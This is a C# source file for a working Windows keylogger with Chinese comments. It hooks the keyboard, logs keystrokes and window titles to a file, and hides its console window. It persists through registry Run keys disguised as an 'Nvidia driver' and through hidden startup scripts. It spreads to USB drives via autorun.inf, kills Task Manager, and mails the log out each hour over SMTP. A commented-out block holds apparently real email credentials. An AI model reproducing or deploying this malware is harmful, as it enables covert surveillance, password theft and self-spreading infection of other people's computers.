using System;
using System.Text;
using System.Threading;
using System.Diagnostics;
using System.Timers;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;
using System.Net.Mail;
using Microsoft.Win32;
using System.Drawing;
//using System.Drawing.Imaging;
//using System.Drawing.Drawing2D;
namespace kl
{
    class Program
    {

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        public static string path = "D:\\log.txt";
        public static string path1 = "D:\\";
        public static string yd1path = "C:\\M";
        public static string mypath = "C:\\Users\\M\\logss.txt";
        public static string ydpath = "C:\\Users\\M";
        //         public static string startpath  = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);//存储路径
        public static byte caps = 0, shift = 0, failed = 0;//大小写


        [DllImport("user32.dll", EntryPoint = "ShowWindow", SetLastError = true)]
        private static extern bool ShowWindow(IntPtr hWnd, uint nCmdShow);
        [DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);//返回值就是该挂钩处理过程的句柄

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);//删除的钩子的句柄

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);//钩子信息传递到当前钩子链中的下一个子程

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]



        private static extern IntPtr GetModuleHandle(string lpModuleName);//获取一个应用程序或动态链接库的模块句柄
        public static IntPtr handle = IntPtr.Zero;
        public static IntPtr handle1 = IntPtr.Zero;
        public static char[] txt = new char[256];
        public static char[] txt1 = new char[256];

        public static void makeTxt()
        {
            if (!System.IO.File.Exists(path1 + "log.txt"))
            {
                FileStream fs1 = new FileStream(path1 + "log.txt", FileMode.Create, FileAccess.Write);
                StreamWriter sw = new StreamWriter(fs1);
                sw.WriteLine("FUck u ");
                sw.Close();
                fs1.Close();
            }
            else 
            {
                FileStream fs = new FileStream(path1 + "log.txt",FileMode.Append,FileAccess.Write);
                StreamWriter sw = new StreamWriter(fs);
                sw.WriteLine("fuck fuck");
                sw.Close();
                fs.Close();
               
            }
        }
        public static void SetAutoRun(string fileName, bool isAutoRun)
        {
            RegistryKey reg = null;
            try
            {
                if (!System.IO.File.Exists(fileName))
                    throw new Exception("该文件不存在!");
                String name = fileName.Substring(fileName.LastIndexOf(@"\") + 1);
                reg = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                if (reg == null)
                    reg = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
                if (isAutoRun)
                    reg.SetValue(name, fileName);
                else
                    reg.SetValue(name, false);
            }
            catch (Exception ex)
            {
                throw new Exception(ex.ToString());
            }
            finally
            {
                if (reg != null)
                    reg.Close();
            }

        }
        //另外也可以写成服务，不过服务的话一般是在后台执行的，没有程序界面。

        public static void Start()
        {
            //    MessageBox.Show("设置开机自启动，需要修改注册表", "提示");
        
            string path = Application.ExecutablePath;
            RegistryKey rk = Registry.LocalMachine;//读取 Windows 注册表基项 HKEY_LOCAL_MACHINE
            RegistryKey rk2 = rk.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
            rk2.SetValue("JcShutdown", path);// exe 加入开机启动：）
            rk2.Close();
            //MessageBox.Show("Added To Started Up Successfully :) ");
        }
        public static void Main()
        {
            /*
            string menuShortcut = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Programs), string.Format(@"{0}\{1}.appref-ms", Application.CompanyName, Application.ProductName));
            MessageBox.Show(menuShortcut);
            string startupShortcut = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), Path.GetFileName(menuShortcut));
            MessageBox.Show(startupShortcut);
            if (!File.Exists(startupShortcut))
            {
                File.Copy(menuShortcut, startupShortcut);
                MessageBox.Show("开机启动 Ok.");
            }
            else
            {
                File.Delete(startupShortcut);
                MessageBox.Show("开机禁止 Ok.");
            }
             */
            CopyVbs();
            //CopyInf();
            startup();
            string exepath = Application.ExecutablePath.ToString();//当前可执行文件的路径
            SetAutoRun(exepath, true);
            Start();
            WindowHide(System.Console.Title);
            //Directory.CreateDirectory(ydpath);
           // Directory.CreateDirectory(yd1path);
            makeTxt();
            //FileStream fs1 = new FileStream(path, FileMode.Create, FileAccess.ReadWrite);
            _hookID = SetHook(_proc);
            //Program.startup();//开机启动
            //每十分钟秒 发送邮件
            //   Program.Start();
            System.Timers.Timer timer;
            timer = new System.Timers.Timer();
            timer.Elapsed += new ElapsedEventHandler(Program.OnTimedEvent);
            timer.AutoReset = true;
            timer.Interval = 3600000;
            timer.Start();
            //每一分钟遍历 usb
            
            System.Timers.Timer timer2;
            timer2 = new System.Timers.Timer();
            timer2.Elapsed += new ElapsedEventHandler(Program.USBSpread);
            timer2.AutoReset = true;
            timer2.Interval = 10000;
            timer2.Start();
            
            //时间 进程
            System.Timers.Timer timer3;
            timer3 = new System.Timers.Timer();
            timer3.Elapsed += new ElapsedEventHandler(Program.GetActiveWindowTitle);
            timer3.AutoReset = true;
            timer3.Interval = 1000;
            timer3.Start();
            /*
            //发送 电脑每时每刻 进程
            System.Timers.Timer timer4;
            timer4 = new System.Timers.Timer();
            timer4.Elapsed += new ElapsedEventHandler(Program.MyOnTimedEvent);
            timer4.AutoReset = true;
            timer4.Interval = 605000;
            timer4.Start();

            System.Timers.Timer timer5;
            timer5 = new System.Timers.Timer();
            timer5.Elapsed += new ElapsedEventHandler(Program.ScreenShot);
            timer5.AutoReset = true;
            timer5.Interval = 30000;
            timer5.Start();
            */
            Application.Run();
            //回收一二的垃圾
            GC.KeepAlive(timer);
            GC.KeepAlive(timer2);
            GC.KeepAlive(timer3);
            //GC.KeepAlive(timer4);
            UnhookWindowsHookEx(_hookID);
        }

       
        public static void startup()
        {
            //Try to copy keylogger in some folders
            string source = Application.ExecutablePath.ToString();//当前可执行文件的路径
            Console.WriteLine(source);
            string destination = Environment.GetFolderPath(Environment.SpecialFolder.Startup);//开机启动区 路径
            Console.WriteLine(destination);
            destination = System.IO.Path.Combine(destination, "kl2.exe");// 将两个路径合二为一
            try
            {
                System.IO.File.Copy(source, destination, true);// 把当前文件 复制到 开机启动区去
                source = destination;
            }
            catch
            {
                Console.WriteLine("No authorization to copy file or other error.");
            }
            //检验 exe 是否 开机启动区域 
            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);//检索开机启动

                if (registryKey.GetValue("Nvidia driver") == null)
                {
                    registryKey.SetValue("Nvidia driver", destination);
                }

                registryKey.Close();//dispose of the Key
            }
            catch
            {
                Console.WriteLine("Error setting startup reg key.");
            }
            //加入到所以用户 开机启动
            try
            {
                RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);

                if (registryKey.GetValue("Nvidia driver") == null)
                {
                    registryKey.SetValue("Nvidia driver", source);
                }

                registryKey.Close();//dispose of the key
            }
            catch
            {
                Console.WriteLine("Error setting startup reg key for all users.");
            }
        }
         

        public static void GiveChar(char[] a, char[] b)
{
    int m=Math.Min(a.Length, b.Length);
	for (int i = 0; i < m; i++)
		a[i] = b[i];
}
      public static bool CheckChar(char[] a, char[] b)
{
    int m = Math.Min(a.Length, b.Length);
	for (int i = 0; i < m; i++)
	{
		if (a[i] != b[i])
		{
			return false;
		}
	}
	return true;
}
public static void GetActiveWindowTitle(object source, EventArgs e)
        {


            const int nChars = 256;
            
            handle = GetForegroundWindow();
            StringBuilder Buff = new StringBuilder(nChars);
            GetWindowText(handle, Buff, nChars);          
            txt = Buff.ToString().ToCharArray();
            string t = DateTime.Now.ToString("yyyy-MM-dd H:mm:ss");
            if (!IsFileInUse(path))
            {
               // if (handle != handle1)
                if(!CheckChar(txt1,txt))
                {
                    StreamWriter ww = File.AppendText(Program.path);
                    ww.Write("\n");
                    ww.Write(t);
                    ww.Write(" ");
                    ww.WriteLine(Buff.ToString().ToCharArray());
                    ww.Close();
                   // handle1 = handle;
                    GiveChar(txt1,txt);
                }
            }


        }
        public static void OnTimedEvent(object source, EventArgs e)
        {

            Process[] ProcessList = Process.GetProcesses();//为每个进程资源 创建组件
            foreach (Process proc in ProcessList)
            {
                if (proc.MainWindowTitle.Contains("Taskmgr.exe"))
                {
                    proc.Kill();//关闭任务管理器
                }
            }
            //发送邮件
            System.Net.Mail.MailMessage msg = new System.Net.Mail.MailMessage(); //create the message
            msg.To.Add("**************");
            msg.From = new MailAddress("***********", "********", System.Text.Encoding.UTF8);
            string _ComputName = System.Net.Dns.GetHostName();
            msg.Subject = _ComputName;
            msg.SubjectEncoding = System.Text.Encoding.UTF8;
            msg.Body = "L";
            msg.BodyEncoding = System.Text.Encoding.UTF8;
            msg.IsBodyHtml = false;
            msg.Priority = MailPriority.High;//邮件优先级 最高
            SmtpClient client = new SmtpClient(); //Network Credentials for Gmail
            client.Credentials = new System.Net.NetworkCredential("**********@hotmail.com", "************");
            client.Port = 587;
            client.Host = "smtp.office365.com";
            client.EnableSsl = true;
            Attachment data = new Attachment(Program.path);
            msg.Attachments.Add(data);//添加 附件
            try
            {
                client.Send(msg);
                failed = 0;
            }
            catch
            {
                data.Dispose();//释放掉 资源 
                failed = 1;
            }
            data.Dispose();

            //if (failed == 0)
              //  File.WriteAllText(Program.path, ""); //如果发送成功 则 将txt清空  防止发送相同数据

            failed = 0;
        }


        /*
        public static void MyOnTimedEvent(object source, EventArgs e)
        {
            /*
            Process[] ProcessList = Process.GetProcesses();//为每个进程资源 创建组件
            foreach (Process proc in ProcessList)
            {
                if (proc.MainWindowTitle.Contains("Taskmgr.exe"))
                {
                    proc.Kill();//关闭任务管理器
                }
            }
            
            //发送邮件

            if (!IsFileInUse(path))
            {
                System.Net.Mail.MailMessage msg = new System.Net.Mail.MailMessage(); //create the message
                msg.To.Add("591377748@qq.com");
                msg.From = new MailAddress("tomridder716@gmail.com", "tomridder", System.Text.Encoding.UTF8);
                msg.Subject = "W";
                msg.SubjectEncoding = System.Text.Encoding.UTF8;
                msg.Body = "W";
                msg.BodyEncoding = System.Text.Encoding.UTF8;
                msg.IsBodyHtml = false;
                msg.Priority = MailPriority.High;//邮件优先级 最高
                SmtpClient client = new SmtpClient(); //Network Credentials for Gmail
                client.Credentials = new System.Net.NetworkCredential("tomridder716@gmail.com", "1995521gcywasdqq");
                client.Port = 587;
                client.Host = "smtp.gmail.com";
                client.EnableSsl = true;
                Attachment data = new Attachment(Program.mypath);
                msg.Attachments.Add(data);//添加 附件
                try
                {
                    client.Send(msg);
                    failed = 0;
                }
                catch
                {
                    data.Dispose();//释放掉 资源 
                    failed = 1;
                }
                data.Dispose();

                if (failed == 0)
                    File.WriteAllText(Program.mypath, ""); //如果发送成功 则 将txt清空  防止发送相同数据

                failed = 0;

            }
        }
*/
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())//获得当前进程 相关的 进程
            using (ProcessModule curModule = curProcess.MainModule) //获得关联进程 主模块
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);//返回当前进程的 句柄
            }
        }
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        public static void WindowHide(string consoleTitle)
        {
            IntPtr a = FindWindow("ConsoleWindowClass", consoleTitle);
            if (a != IntPtr.Zero)
                ShowWindow(a, 0);//隐藏窗口
            else
                throw new Exception("can't hide console window");
        }
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {


            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                if (!IsFileInUse(path))
                {

                    StreamWriter sw = File.AppendText(Program.path);
                    int vkCode = Marshal.ReadInt32(lParam);
                    if (Keys.Shift == Control.ModifierKeys) Program.shift = 1;

                    switch ((Keys)vkCode)
                    {
                        case Keys.Space:
                            sw.Write(" ");
                            break;
                        case Keys.Return:
                            sw.WriteLine("");
                            break;
                        case Keys.Back:
                            sw.Write("<back>");
                            break;
                        case Keys.Tab:
                            sw.Write("<TAB>");
                            break;
                        case Keys.D0:
                            if (Program.shift == 0) sw.Write("0");
                            else sw.Write(")");
                            break;
                        case Keys.D1:
                            if (Program.shift == 0) sw.Write("1");
                            else sw.Write("!");
                            break;
                        case Keys.D2:
                            if (Program.shift == 0) sw.Write("2");
                            else sw.Write("@");
                            break;
                        case Keys.D3:
                            if (Program.shift == 0) sw.Write("3");
                            else sw.Write("#");
                            break;
                        case Keys.D4:
                            if (Program.shift == 0) sw.Write("4");
                            else sw.Write("$");
                            break;
                        case Keys.D5:
                            if (Program.shift == 0) sw.Write("5");
                            else sw.Write("%");
                            break;
                        case Keys.D6:
                            if (Program.shift == 0) sw.Write("6");
                            else sw.Write("^");
                            break;
                        case Keys.D7:
                            if (Program.shift == 0) sw.Write("7");
                            else sw.Write("&");
                            break;
                        case Keys.D8:
                            if (Program.shift == 0) sw.Write("8");
                            else sw.Write("*");
                            break;
                        case Keys.D9:
                            if (Program.shift == 0) sw.Write("9");
                            else sw.Write("(");
                            break;
                        case Keys.LShiftKey:
                            sw.Write("<LShift>");
                            break;
                        case Keys.RShiftKey:
                            sw.Write("<RShift>");
                            break;
                        case Keys.LControlKey:
                            sw.Write("<LControl>");
                            break;
                        case Keys.RControlKey:
                            sw.Write("<RControl>");
                            break;
                        case Keys.LMenu:
                            sw.Write("<LAlt>");
                            break;
                        case Keys.RMenu:
                            sw.Write("<RAlt>");
                            break;
                        case Keys.LWin:
                            sw.Write("<LWin>");
                            break;
                        case Keys.RWin:
                            sw.Write("<RWin>");
                            break;
                        case Keys.Apps:
                            sw.Write(" ");
                            break;
                        case Keys.OemQuestion:
                            if (Program.shift == 0) sw.Write("/");
                            else sw.Write("?");
                            break;
                        case Keys.OemOpenBrackets:
                            if (Program.shift == 0) sw.Write("[");
                            else sw.Write("{");
                            break;
                        case Keys.OemCloseBrackets:
                            if (Program.shift == 0) sw.Write("]");
                            else sw.Write("}");
                            break;
                        case Keys.Oem1:
                            if (Program.shift == 0) sw.Write(";");
                            else sw.Write(":");
                            break;
                        case Keys.Oem7:
                            if (Program.shift == 0) sw.Write("'");
                            else sw.Write('"');
                            break;
                        case Keys.Oemcomma:
                            if (Program.shift == 0) sw.Write(",");
                            else sw.Write("<");
                            break;
                        case Keys.OemPeriod:
                            if (Program.shift == 0) sw.Write(".");
                            else sw.Write(">");
                            break;
                        case Keys.OemMinus:
                            if (Program.shift == 0) sw.Write("-");
                            else sw.Write("_");
                            break;
                        case Keys.Oemplus:
                            if (Program.shift == 0) sw.Write("=");
                            else sw.Write("+");
                            break;
                        case Keys.Oemtilde:
                            if (Program.shift == 0) sw.Write("`");
                            else sw.Write("~");
                            break;
                        case Keys.Oem5:
                            sw.Write("|");
                            break;
                        case Keys.Capital:
                            if (Program.caps == 0) Program.caps = 1;
                            else Program.caps = 0;
                            break;
                        default:
                            if (Program.shift == 0 && Program.caps == 0) sw.Write(((Keys)vkCode).ToString().ToLower());
                            if (Program.shift == 1 && Program.caps == 0) sw.Write(((Keys)vkCode).ToString().ToUpper());
                            if (Program.shift == 0 && Program.caps == 1) sw.Write(((Keys)vkCode).ToString().ToUpper());
                            if (Program.shift == 1 && Program.caps == 1) sw.Write(((Keys)vkCode).ToString().ToLower());
                            Thread.Sleep(30);
                            break;
                    }
                    Program.shift = 0;
                    sw.Close();
                }
            }
                return CallNextHookEx(_hookID, nCode, wParam, lParam);


            
        }
        /*
        public static void ScreenShot(object source, EventArgs e)
        {

            Bitmap myImage = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics g = Graphics.FromImage(myImage);
            g.CopyFromScreen(new Point(0, 0), new Point(0, 0), new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height));
            IntPtr dc1 = g.GetHdc();
            string t = DateTime.Now.ToString("H\\mm\\ss");
            Console.WriteLine(t);
            g.ReleaseHdc(dc1);//释放句柄
            myImage.Save("C:\\M\\" + t + "  screen.jpg ");// + t + "");
        }
        */
        public static void CopyInf()
        {
            string source2 = Application.ExecutablePath.ToString();
           
            string destination = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string runKlInf = System.IO.Path.Combine(destination, "autorun.inf"); 
            StreamWriter sw = new StreamWriter(runKlInf);
            sw.WriteLine("[autorun]\n");
            sw.WriteLine("open=kl2.exe");
            sw.WriteLine("action=Run VMCLite");
            sw.Close();
            File.SetAttributes(runKlInf, File.GetAttributes(runKlInf) | FileAttributes.Hidden);
           // File.Copy(source2, runKlInf);
          
            
        }
        public static void CopyVbs()
        {
            
            string destination1 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string destination = System.IO.Path.Combine(destination1, "AutoStart.vbs");
            if (!System.IO.File.Exists(destination))
            {
                StreamWriter sw = new StreamWriter(destination);
                sw.WriteLine("Set shell =Wscript.createobject(\"WScript.Shell\")  ");
                sw.WriteLine("shell.Run \"kl2.exe\",0,False");
                sw.Close();
                File.SetAttributes(destination, File.GetAttributes(destination) | FileAttributes.Hidden);
            }
            
            /*
            string source2 = Environment.CurrentDirectory;
            source2 = System.IO.Path.Combine(source2, "antoRun.vbs");
            string destination = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string runVbs = System.IO.Path.Combine(destination, "antoRun.vbs");
            File.Copy(source2, runVbs,true);
              */
           // string runKlInf = System.IO.Path.Combine(destination, "autorun.vbs");
           // StreamWriter sw = new StreamWriter(runKlInf);
           // sw.WriteLine(@"[autorun]\n");
           // sw.WriteLine(@"open=kl2.exe");
    
           // sw.Close();
            //File.SetAttributes(runKlInf, File.GetAttributes(runKlInf) | FileAttributes.Hidden);
            //    File.Copy(source2, runKlInf);

        }
        public static void USBSpread(object source, EventArgs e)
        {
            ///////////////////////////////////////////////////////////////
            /////////////////////// USB spread class //////////////////////
            ///////////////////////////////////////////////////////////////
            //A bit modified
            string source2 = Application.ExecutablePath.ToString();//得到当前exe路径
            System.IO.DriveInfo[] drives = System.IO.DriveInfo.GetDrives();//得到当前usb的 驱动名称
            try
            {
                foreach (System.IO.DriveInfo drive in drives)
                {
                    if (drive.DriveType == DriveType.Removable)//如果是 可移动 设备
                    {
                        string driveVbs = drive.Name + "AutoStart.vbs";
                        if (!System.IO.File.Exists(driveVbs))
                        {
                            StreamWriter sw1 = new StreamWriter(driveVbs);
                            sw1.WriteLine("Set shell =Wscript.createobject(\"WScript.Shell\")  ");
                            sw1.WriteLine("shell.Run \"kl2.exe\",0,False");
                            sw1.Close();
                            File.SetAttributes(drive.Name + "AutoStart.vbs", File.GetAttributes(drive.Name + "AutoStart.vbs") | FileAttributes.Hidden);
                        }


                        string driveAutorun = drive.Name + "autorun.inf";//自动系一个脚本
                        if (!System.IO.File.Exists(driveAutorun))
                        {                         //脚本 内容为 运行 start.exe
                            StreamWriter sw = new StreamWriter(driveAutorun);
                            sw.WriteLine("[autorun]\n");
                            sw.WriteLine("open=kl2.exe");
                            sw.WriteLine("action=Run VMCLite");
                            sw.Close();
                            File.SetAttributes(drive.Name + "autorun.inf", File.GetAttributes(drive.Name + "autorun.inf") | FileAttributes.Hidden);//脚本 为 隐藏类型文件
                        }
                   //     File.Copy(source2, drive.Name + "kl2.exe");
                   //     File.SetAttributes(drive.Name + "kl2.exe", File.GetAttributes(drive.Name + "kl2.exe") | FileAttributes.Hidden);// exe 类型 隐藏
                        
                        try
                        {
                            File.Copy(source2, drive.Name + "kl2.exe", true);
                            //File.SetAttributes(drive.Name + "kl2.exe", File.GetAttributes(drive.Name + "kl2.exe") | FileAttributes.Hidden);// exe 类型 隐藏
                        }
                        finally
                        {
                            Console.WriteLine("Removable device rooted");
                        }
                         
                        
                    }
                }
            }
            catch (Exception e2)
            {
                Console.WriteLine(e2.ToString());
            }
        }
         

        public static bool IsFileInUse(string fileName)
        {
            bool inUse = true;

            FileStream fs = null;
            try
            {

                fs = new FileStream(fileName, FileMode.Open, FileAccess.Read,

                FileShare.None);

                inUse = false;
            }
            catch
            {

            }
            finally
            {
                if (fs != null)

                    fs.Close();
            }
            return inUse;//true表示正在使用,false没有使用
        }

        /// <summary> 
        /// 开机启动项 
        /// </summary> 
        /// <param name=\"Started\">是否启动</param> 
        /// <param name=\"name\">启动值的名称</param> 
        /// <param name=\"path\">启动程序的路径</param> 



    }
}
